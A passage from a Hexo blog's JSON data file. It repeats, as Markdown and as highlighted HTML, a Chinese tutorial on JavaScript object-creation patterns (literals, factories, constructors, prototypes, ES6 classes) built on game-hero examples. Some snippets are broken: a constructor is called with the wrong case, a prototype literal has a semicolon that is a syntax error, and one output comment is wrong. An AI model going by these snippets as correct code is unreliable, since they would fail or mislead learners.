yasuo\np1.skillLists;  // ['Q', 'W', 'E', 'R']\np2.do();        // ashe use w kill MasterYi\n```\n\n#### 6. 使用`class`关键字\n```javascript\nclass Hero {\n    constructor(){\n        this.name = 'MasterYi';\n        this.skill = 'AlphaStrike';\n    }\n    do(enemy){\n        alert(this.name + ' use ' +  this.skill + ' kill ' + enemy)\n    }\n}\n\nlet ashe = new Hero();\nashe.do('ashe');       // MasterYi use AlphaStrike kill ashe\n\nclass Yasuo extends Hero {\n    constructor(){\n        super()\n        this.name = 'yasuo'\n    }\n}\nlet yasuo = new Yasuo();\nyasuo.do('timor');      // yasuo use AlphaStrike kill timor\n```\n这里涉及到 `ES6` 里的新特性，想了解 `ES6` 中更多的新特性，大家可以去看看 [阮一峰](http://es6.ruanyifeng.com/) 老师的博客。","source":"_posts/0809008_JavaScript面向对象.md","raw":"---\nid: 0809008\ntitle: JavaScript 面向对象\ndate: 2017-03-26 15:52:37\ntags: \n    - JavaScript\ncategories:\n---\n\n#### 1. 原始方式：\n* 对象字面量方式\n```javascript\nvar Hero = { \n    name: 'MasterYi',\n    skill: 'AlphaStrike',\n    todo: function () { alert(this.name); }\n};\n```\n* Object构造函数方式\n```javascript\nvar Hero = new Object();\n\nHero.name = 'MasterYi';\nHero.skill = 'Q';\nHero.do = function(){\n    return this.name + ' use ' + this.skill + ' kill ' + 'yasuo';\n}\n\nalert( Hero.skill );    // AlphaStrike\nalert( Hero.do() );     // MasterYi use AlphaStrike kill yasuo\n```\n如上，当我们要创建批量的Hero1、Hero2……时，\n每次都要敲很多代码，资深copypaster都吃不消！\n然后就有了下面批量生产的工厂模式。\n\n#### 2. 工厂模式\n```javascript\nfunction heroObj(name, skill){\n    var Hero = new Object();\n\n    Hero.name = name;\n    Hero.skill = skill;\n    Hero.do = function(){\n        return this.name + ' use ' + this.skill + ' kill ' + 'MasterYi';\n    }\n\n    return Hero;\n}\nvar riven = heroObj('yasuo', 'R');\nvar ashe = heroObj('Caitlin', 'W');\n\nalert(riven.skill);     // R\nalert(ashe.do());       // Caitlin use W kill MasterYi\n```\n工厂模式就是批量化生产，简单调用就可以进入造人模式（啪啪啪……）。\n指定姓名年龄就可以造一堆小宝宝啦，解放双手。\n但是由于是工厂暗箱操作的，所以你不能识别这个对象到底是什么类型、\n是人还是狗傻傻分不清（instanceof 测试为 Object），\n另外每次造人时都要创建一个独立的temp对象，代码臃肿，你受得了？\n\n#### 3. 构造函数\n```javascript\nfunction HeroObj(name, skill){\n\n    this.name = name;\n    this.skill = skill;\n    this.do = function(){\n        return this.name + ' use ' + this.skill + ' kill ' + 'MasterYi';\n    }\n\n}\n\nvar riven = new heroObj('yasuo', 'R');\nvar ashe = new heroObj('Caitlin', 'W');\n\nalert(riven.skill);     // R\nalert(ashe.do());       // Caitlin use W kill MasterYi\n```\nECMAScript中的构造函数可以用来创建特定类型的对象。像Object和Array的原生的构造函数，在运行时会自动出现在执行环境中。此外，也可以创建自定义的构造函数，从而定义自定义对象类型的属性和方法。\n\n#### 4. 原型模式\n* 直接使用 prototype 属性\n```javascript\nfunction Hero () {}\nHero.prototype.name = 'MasterYi';\nHero.prototype.skill = 'AlphaStrike';\nHero.prototype.do = function () { alert(this.name); };\n```\n* 字面量定义方式\n```javascript\nfunction Hero () {}\nHero.prototype = {\n    name: 'MasterYi',\n    skill: 'AlphaStrike',\n    sayName: function () { alert(this.name); }\n};\nvar p1 = new Hero(); //name='MasterYi'\nvar p2 = new Hero(); //name='MasterYi'\n```\n这里需要注意的是原型属性和方法的共享，即所有实例中都只是引用原型中的属性方法，任何一个地方产生的改动会引起其他实例的变化。\n\n#### 5. 混合模式\n```javascript\nfunction Hero (name, skill) {\n    this.name = name;\n    this.skill = skill;\n}\nHero.prototype = {\n    skillLists: ['Q', 'W', 'E', 'R'];\n    sayName: function () {\n        alert(this.name);\n    },\n    do: function () {\n        alert(this.name + ' use ' + this.skill + ' kill ' + 'MasterYi');\n    }\n};\nvar p1 = new Hero('yasuo', 'R');\nvar p2 = new Hero('ashe', 'w');\np1.sayName();   // yasuo\np1.skillLists;  // ['Q', 'W', 'E', 'R']\np2.do();        // ashe use w kill MasterYi\n```\n\n#### 6. 使用`class`关键字\n```javascript\nclass Hero {\n    constructor(){\n        this.name = 'MasterYi';\n        this.skill = 'AlphaStrike';\n    }\n    do(enemy){\n        alert(this.name + ' use ' +  this.skill + ' kill ' + enemy)\n    }\n}\n\nlet ashe = new Hero();\nashe.do('ashe');       // MasterYi use AlphaStrike kill ashe\n\nclass Yasuo extends Hero {\n    constructor(){\n        super()\n        this.name = 'yasuo'\n    }\n}\nlet yasuo = new Yasuo();\nyasuo.do('timor');      // yasuo use AlphaStrike kill timor\n```\n这里涉及到 `ES6` 里的新特性，想了解 `ES6` 中更多的新特性，大家可以去看看 [阮一峰](http://es6.ruanyifeng.com/) 老师的博客。","slug":"0809008_JavaScript面向对象","published":1,"updated":"2018-03-26T12:16:03.453Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtd0008s4c0pn8ovebh","content":"<h4 id=\"1-原始方式：\"><a href=\"#1-原始方式：\" class=\"headerlink\" title=\"1. 原始方式：\"></a>1. 原始方式：</h4><ul>\n<li><p>对象字面量方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Hero = &#123; </span><br><span class=\"line\">    name: <span class=\"string\">'MasterYi'</span>,</span><br><span class=\"line\">    skill: <span class=\"string\">'AlphaStrike'</span>,</span><br><span class=\"line\">    todo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Object构造函数方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Hero = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Hero.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">Hero.skill = <span class=\"string\">'Q'</span>;</span><br><span class=\"line\">Hero.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'yasuo'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">alert( Hero.skill );    <span class=\"comment\">// AlphaStrike</span></span><br><span class=\"line\">alert( Hero.do() );     <span class=\"comment\">// MasterYi use AlphaStrike kill yasuo</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如上，当我们要创建批量的Hero1、Hero2……时，<br>每次都要敲很多代码，资深copypaster都吃不消！<br>然后就有了下面批量生产的工厂模式。</p>\n<h4 id=\"2-工厂模式\"><a href=\"#2-工厂模式\" class=\"headerlink\" title=\"2. 工厂模式\"></a>2. 工厂模式</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">heroObj</span>(<span class=\"params\">name, skill</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> Hero = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Hero.name = name;</span><br><span class=\"line\">    Hero.skill = skill;</span><br><span class=\"line\">    Hero.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Hero;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> riven = heroObj(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> ashe = heroObj(<span class=\"string\">'Caitlin'</span>, <span class=\"string\">'W'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">alert(riven.skill);     <span class=\"comment\">// R</span></span><br><span class=\"line\">alert(ashe.do());       <span class=\"comment\">// Caitlin use W kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<p>工厂模式就是批量化生产，简单调用就可以进入造人模式（啪啪啪……）。<br>指定姓名年龄就可以造一堆小宝宝啦，解放双手。<br>但是由于是工厂暗箱操作的，所以你不能识别这个对象到底是什么类型、<br>是人还是狗傻傻分不清（instanceof 测试为 Object），<br>另外每次造人时都要创建一个独立的temp对象，代码臃肿，你受得了？</p>\n<h4 id=\"3-构造函数\"><a href=\"#3-构造函数\" class=\"headerlink\" title=\"3. 构造函数\"></a>3. 构造函数</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HeroObj</span>(<span class=\"params\">name, skill</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.skill = skill;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> riven = <span class=\"keyword\">new</span> heroObj(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> ashe = <span class=\"keyword\">new</span> heroObj(<span class=\"string\">'Caitlin'</span>, <span class=\"string\">'W'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">alert(riven.skill);     <span class=\"comment\">// R</span></span><br><span class=\"line\">alert(ashe.do());       <span class=\"comment\">// Caitlin use W kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<p>ECMAScript中的构造函数可以用来创建特定类型的对象。像Object和Array的原生的构造函数，在运行时会自动出现在执行环境中。此外，也可以创建自定义的构造函数，从而定义自定义对象类型的属性和方法。</p>\n<h4 id=\"4-原型模式\"><a href=\"#4-原型模式\" class=\"headerlink\" title=\"4. 原型模式\"></a>4. 原型模式</h4><ul>\n<li><p>直接使用 prototype 属性</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Hero.prototype.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">Hero.prototype.skill = <span class=\"string\">'AlphaStrike'</span>;</span><br><span class=\"line\">Hero.prototype.do = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字面量定义方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Hero.prototype = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">'MasterYi'</span>,</span><br><span class=\"line\">    skill: <span class=\"string\">'AlphaStrike'</span>,</span><br><span class=\"line\">    sayName: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = <span class=\"keyword\">new</span> Hero(); <span class=\"comment\">//name='MasterYi'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> p2 = <span class=\"keyword\">new</span> Hero(); <span class=\"comment\">//name='MasterYi'</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>这里需要注意的是原型属性和方法的共享，即所有实例中都只是引用原型中的属性方法，任何一个地方产生的改动会引起其他实例的变化。</p>\n<h4 id=\"5-混合模式\"><a href=\"#5-混合模式\" class=\"headerlink\" title=\"5. 混合模式\"></a>5. 混合模式</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\">name, skill</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.skill = skill;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Hero.prototype = &#123;</span><br><span class=\"line\">    skillLists: [<span class=\"string\">'Q'</span>, <span class=\"string\">'W'</span>, <span class=\"string\">'E'</span>, <span class=\"string\">'R'</span>];</span><br><span class=\"line\">    sayName: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"keyword\">do</span>: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = <span class=\"keyword\">new</span> Hero(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> p2 = <span class=\"keyword\">new</span> Hero(<span class=\"string\">'ashe'</span>, <span class=\"string\">'w'</span>);</span><br><span class=\"line\">p1.sayName();   <span class=\"comment\">// yasuo</span></span><br><span class=\"line\">p1.skillLists;  <span class=\"comment\">// ['Q', 'W', 'E', 'R']</span></span><br><span class=\"line\">p2.do();        <span class=\"comment\">// ashe use w kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"6-使用class关键字\"><a href=\"#6-使用class关键字\" class=\"headerlink\" title=\"6. 使用class关键字\"></a>6. 使用<code>class</code>关键字</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Hero</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.skill = <span class=\"string\">'AlphaStrike'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">do</span>(enemy)&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> +  <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + enemy)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> ashe = <span class=\"keyword\">new</span> Hero();</span><br><span class=\"line\">ashe.do(<span class=\"string\">'ashe'</span>);       <span class=\"comment\">// MasterYi use AlphaStrike kill ashe</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Yasuo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Hero</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = <span class=\"string\">'yasuo'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> yasuo = <span class=\"keyword\">new</span> Yasuo();</span><br><span class=\"line\">yasuo.do(<span class=\"string\">'timor'</span>);      <span class=\"comment\">// yasuo use AlphaStrike kill timor</span></span><br></pre></td></tr></table></figure>\n<p>这里涉及到 <code>ES6</code> 里的新特性，想了解 <code>ES6</code> 中更多的新特性，大家可以去看看 <a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">阮一峰</a> 老师的博客。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-原始方式：\"><a href=\"#1-原始方式：\" class=\"headerlink\" title=\"1. 原始方式：\"></a>1. 原始方式：</h4><ul>\n<li><p>对象字面量方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Hero = &#123; </span><br><span class=\"line\">    name: <span class=\"string\">'MasterYi'</span>,</span><br><span class=\"line\">    skill: <span class=\"string\">'AlphaStrike'</span>,</span><br><span class=\"line\">    todo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Object构造函数方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Hero = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Hero.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">Hero.skill = <span class=\"string\">'Q'</span>;</span><br><span class=\"line\">Hero.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'yasuo'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">alert( Hero.skill );    <span class=\"comment\">// AlphaStrike</span></span><br><span class=\"line\">alert( Hero.do() );     <span class=\"comment\">// MasterYi use AlphaStrike kill yasuo</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如上，当我们要创建批量的Hero1、Hero2……时，<br>每次都要敲很多代码，资深copypaster都吃不消！<br>然后就有了下面批量生产的工厂模式。</p>\n<h4 id=\"2-工厂模式\"><a href=\"#2-工厂模式\" class=\"headerlink\" title=\"2. 工厂模式\"></a>2. 工厂模式</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">heroObj</span>(<span class=\"params\">name, skill</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> Hero = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Hero.name = name;</span><br><span class=\"line\">    Hero.skill = skill;</span><br><span class=\"line\">    Hero.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Hero;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> riven = heroObj(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> ashe = heroObj(<span class=\"string\">'Caitlin'</span>, <span class=\"string\">'W'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">alert(riven.skill);     <span class=\"comment\">// R</span></span><br><span class=\"line\">alert(ashe.do());       <span class=\"comment\">// Caitlin use W kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<p>工厂模式就是批量化生产，简单调用就可以进入造人模式（啪啪啪……）。<br>指定姓名年龄就可以造一堆小宝宝啦，解放双手。<br>但是由于是工厂暗箱操作的，所以你不能识别这个对象到底是什么类型、<br>是人还是狗傻傻分不清（instanceof 测试为 Object），<br>另外每次造人时都要创建一个独立的temp对象，代码臃肿，你受得了？</p>\n<h4 id=\"3-构造函数\"><a href=\"#3-构造函数\" class=\"headerlink\" title=\"3. 构造函数\"></a>3. 构造函数</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HeroObj</span>(<span class=\"params\">name, skill</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.skill = skill;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.do = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> riven = <span class=\"keyword\">new</span> heroObj(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> ashe = <span class=\"keyword\">new</span> heroObj(<span class=\"string\">'Caitlin'</span>, <span class=\"string\">'W'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">alert(riven.skill);     <span class=\"comment\">// R</span></span><br><span class=\"line\">alert(ashe.do());       <span class=\"comment\">// Caitlin use W kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<p>ECMAScript中的构造函数可以用来创建特定类型的对象。像Object和Array的原生的构造函数，在运行时会自动出现在执行环境中。此外，也可以创建自定义的构造函数，从而定义自定义对象类型的属性和方法。</p>\n<h4 id=\"4-原型模式\"><a href=\"#4-原型模式\" class=\"headerlink\" title=\"4. 原型模式\"></a>4. 原型模式</h4><ul>\n<li><p>直接使用 prototype 属性</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Hero.prototype.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">Hero.prototype.skill = <span class=\"string\">'AlphaStrike'</span>;</span><br><span class=\"line\">Hero.prototype.do = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字面量定义方式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Hero.prototype = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">'MasterYi'</span>,</span><br><span class=\"line\">    skill: <span class=\"string\">'AlphaStrike'</span>,</span><br><span class=\"line\">    sayName: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert(<span class=\"keyword\">this</span>.name); &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = <span class=\"keyword\">new</span> Hero(); <span class=\"comment\">//name='MasterYi'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> p2 = <span class=\"keyword\">new</span> Hero(); <span class=\"comment\">//name='MasterYi'</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>这里需要注意的是原型属性和方法的共享，即所有实例中都只是引用原型中的属性方法，任何一个地方产生的改动会引起其他实例的变化。</p>\n<h4 id=\"5-混合模式\"><a href=\"#5-混合模式\" class=\"headerlink\" title=\"5. 